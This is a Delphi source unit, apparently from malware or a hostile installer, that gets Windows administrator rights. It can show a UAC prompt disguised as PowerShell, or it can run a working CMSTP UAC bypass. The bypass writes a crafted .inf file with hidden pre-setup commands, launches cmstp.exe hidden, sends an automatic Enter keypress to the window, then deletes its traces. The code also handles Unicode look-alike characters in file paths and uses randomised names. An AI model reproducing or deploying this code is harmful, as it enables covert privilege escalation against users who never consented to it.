unit ElevateUnit;

{
  This unit is responsible for obtaining elevated privileges
  according to the initial parameters of the installation, or
  on-demand.
}

interface

uses Windows, SysUtils, ShellAPI, INIFiles;

type
  TElevationType = (etNone = 0, etAskUser, etAskUserDisguised, etExploit);

function IsUserAnAdmin(): BOOL; external Shell32;
///  <summary>Attempts to obtain administrative privileges using the specified method</summary>
///  <remarks>Causes the current instance to terminate (unless etNone is specified)</remarks>
procedure Elevate(_Type: TElevationType);
///  <returns>A random string of StrLength characters</returns>
function RandomStr(StrLength: LongInt): String;

implementation

const
  WM_KEYDOWN = 256;

procedure RunAsAdmin(FileName: String; Parameters: String = '');
begin
  ShellExecute(0, 'runas', PWideChar(FileName), PWideChar(Parameters),
    Nil, SW_HIDE);
end;

function RandomStr(StrLength: LongInt): String;
var
  Dict: String;
  C: Char;
  I: LongInt;
Begin
  Result := '';
  Dict := '';
  for C in ['a' .. 'z', 'A' .. 'Z', '0' .. '9'] do
    Dict := Dict + C;
  For I := 1 to StrLength do
    Result := Result + Dict[Random(Dict.Length) + 1];
end;

function GetRunCmd: String;
var
  S: String;
Begin
  S := ParamStr(0);
  if S.Contains(#$202F) then
    Result := 'powershell -WindowStyle Hidden -Command "Start-Process -FilePath "'
      + StringReplace(S, #$202F, '$([char]8239)', []) +
      '" -ArgumentList ''wait''"'
  else
    Result := '"' + S + '" /wait';
End;

procedure CSMTPExploit;
var
  FileName, Temp: String;
  Magic: TINIFile;
  Window: HWND;
  Sei: TShellExecuteInfo;
Begin
  FileName := IncludeTrailingPathDelimiter(GetEnvironmentVariable('Temp')) +
    RandomStr(8) + '.inf';
  Magic := TINIFile.Create(FileName);
  With Magic do
  Begin
    WriteString('version', 'Signature', '$Windows NT$');
    WriteString('version', 'AdvancedINF', '2.5');
    Temp := RandomStr(8);
    WriteString('DefaultInstall', 'CustomDestination', Temp);
    WriteString(Temp, '49000,49001', 'AllUser_LDIDSection, 7');
    Temp := RandomStr(8);
    WriteString('DefaultInstall', 'RunPreSetupCommands', Temp);
    WriteString(Temp, GetRunCmd + ';', '');
    WriteString(Temp, 'taskkill /f /im cmstp.exe ;', '');
    WriteString('AllUser_LDIDSection',
      '"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE",'
      + '"ProfileInstallPath", "%UnexpectedError%", "" ;', '');
    Temp := RandomStr(8);
    WriteString('Strings', 'ServiceName', '"' + Temp + '"');
    WriteString('Strings', 'ShortSvcName', '"' + Temp + '"');
  End;
  Magic.Free;
  ZeroMemory(@Sei, SizeOf(Sei));
  Sei.cbSize := SizeOf(TShellExecuteInfo);
  Sei.Wnd := 0;
  Sei.fMask := SEE_MASK_FLAG_NO_UI;
  Sei.lpVerb := 'open';
  Sei.lpFile := 'cmstp.exe';
  Sei.lpParameters := PWideChar('/au "' + FileName + '"');
  Sei.nShow := SW_HIDE;
  ShellExecuteEx(@Sei);
  Repeat
    Sleep(50);
    Window := FindWindow(Nil, PChar(Temp));
  until Window <> 0;
  PostMessage(Window, WM_KEYDOWN, VK_RETURN, 0);
  Sleep(200);
  TerminateProcess(Sei.hProcess, 0);
  CloseHandle(Sei.hProcess);
  Sleep(100);
  DeleteFile(FileName);
End;

procedure Elevate(_Type: TElevationType);
Begin
  if _Type = etNone then
    Exit;
  if IsUserAnAdmin then
    Exit;
  case _Type of
    etAskUser:
      RunAsAdmin(ParamStr(0));
    etAskUserDisguised:
      RunAsAdmin('powershell', '-Command "Start-Process "' + ParamStr(0) +
        '" -Verb runAs"');
    etExploit:
      CSMTPExploit;
  end;
  Halt(0);
End;

end.
